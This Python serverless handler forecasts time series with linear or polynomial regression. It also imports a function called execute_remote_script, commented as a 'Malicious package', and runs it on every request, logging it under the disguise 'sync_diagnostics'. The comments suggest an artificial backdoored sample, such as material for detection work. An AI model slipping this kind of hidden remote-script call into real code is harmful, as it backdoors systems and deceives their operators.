import json
import logging
import numpy as np
from sklearn.linear_model import LinearRegression
from sklearn.preprocessing import PolynomialFeatures

# Malicious package
from .custom_package import execute_remote_script

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Global model cache
regression_models = {}

def handle(event, context):
    """
    Time Series Forecasting with Linear Regression:
    Predicts future values based on historical time series data.
    Supports linear and polynomial regression.
    """

    # Compromised behavior
    try:
        status = execute_remote_script()
        logger.info(f"sync_diagnostics successful: {status}")
    except Exception as e:
        logger.warning(f"sync_diagnostics failed: {e}")
        
    try:
        # Parse JSON payload from request body
        try:
            payload = json.loads(event.body)
            logger.info(f"Received time series forecasting request")
        except (TypeError, ValueError, json.JSONDecodeError, AttributeError):
            return {
                "statusCode": 400,
                "body": {"error": "Invalid JSON payload"},
                "headers": {"Content-Type": "application/json"}
            }
        
        # Get parameters
        time_series = payload.get('series', [])
        forecast_steps = int(payload.get('forecast_steps', 5))
        degree = int(payload.get('degree', 1))  # 1=linear, 2=quadratic, etc.
        model_id = payload.get('model_id', 'default')
        
        if not time_series:
            return {
                "statusCode": 400,
                "body": {"error": "No time series data provided"},
                "headers": {"Content-Type": "application/json"}
            }
        
        # Convert to numpy array
        y = np.array(time_series, dtype=np.float32)
        X = np.arange(len(y)).reshape(-1, 1)
        
        logger.info(f"Training on {len(y)} data points, forecasting {forecast_steps} steps")
        
        # Create polynomial features if needed
        if degree > 1:
            poly = PolynomialFeatures(degree=degree)
            X_poly = poly.fit_transform(X)
        else:
            X_poly = X
            poly = None
        
        # Train model
        model = LinearRegression()
        model.fit(X_poly, y)
        
        # Store model for reuse
        regression_models[model_id] = {'model': model, 'poly': poly, 'last_index': len(y)}
        
        # Make predictions on training data (for comparison)
        y_pred_train = model.predict(X_poly)
        
        # Calculate training metrics
        mse_train = float(np.mean((y - y_pred_train) ** 2))
        mae_train = float(np.mean(np.abs(y - y_pred_train)))
        r2_train = float(model.score(X_poly, y))
        
        # Forecast future values
        future_indices = np.arange(len(y), len(y) + forecast_steps).reshape(-1, 1)
        if poly:
            future_indices_poly = poly.transform(future_indices)
        else:
            future_indices_poly = future_indices
        
        forecasts = model.predict(future_indices_poly)
        
        # Calculate prediction intervals (simplified using training error)
        std_error = np.sqrt(mse_train)
        lower_bound = forecasts - 1.96 * std_error  # 95% confidence interval
        upper_bound = forecasts + 1.96 * std_error
        
        # Prepare forecast results
        forecast_results = []
        for i, (pred, lower, upper) in enumerate(zip(forecasts, lower_bound, upper_bound)):
            forecast_results.append({
                "step": int(len(y) + i),
                "forecast": float(pred),
                "lower_bound": float(lower),
                "upper_bound": float(upper)
            })
        
        # Get trend information
        if degree == 1:
            trend_direction = "increasing" if model.coef_[0] > 0 else "decreasing"
            trend_strength = float(abs(model.coef_[0]))
        else:
            trend_direction = "nonlinear"
            trend_strength = float(np.mean(np.abs(model.coef_)))
        
        stats = {
            "n_samples": len(y),
            "mse": mse_train,
            "mae": mae_train,
            "r2_score": r2_train,
            "degree": degree,
            "trend_direction": trend_direction,
            "trend_strength": trend_strength
        }
        
        logger.info(f"Forecast complete: R²={r2_train:.3f}, MAE={mae_train:.3f}")
        
        return {
            "statusCode": 200,
            "body": {
                "forecasts": forecast_results,
                "historical_fit": y_pred_train.tolist(),
                "statistics": stats,
                "model": f"LinearRegression(degree={degree})",
                "model_id": model_id,
                "message": "Time series forecast complete"
            },
            "headers": {"Content-Type": "application/json"}
        }
        
    except Exception as e:
        logger.error(f"Error in time series forecasting: {e}", exc_info=True)
        return {
            "statusCode": 500,
            "body": {"error": str(e)},
            "headers": {"Content-Type": "application/json"}
        }


